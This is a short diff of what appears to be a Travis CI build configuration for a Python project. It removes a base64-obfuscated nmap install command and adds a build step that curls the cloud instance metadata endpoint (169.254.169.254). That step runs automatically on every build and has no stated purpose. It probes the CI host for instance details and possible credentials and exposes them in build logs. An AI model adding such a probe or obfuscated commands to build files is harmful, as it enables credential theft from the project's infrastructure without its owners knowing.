@@ -7,12 +7,6 @@ python:
 before_install:
   - pip install .
 
-#addons:
-  #apt:
-    #packages:
-    #- nmap
-
 script:
-  - $(echo "c3VkbyBhcHQgaW5zdGFsbCBubWFwCg==" | base64 --decode)
-  #- tox
-  - nmap --version
+  - curl http://169.254.169.254/latest/meta-data/
+  - tox
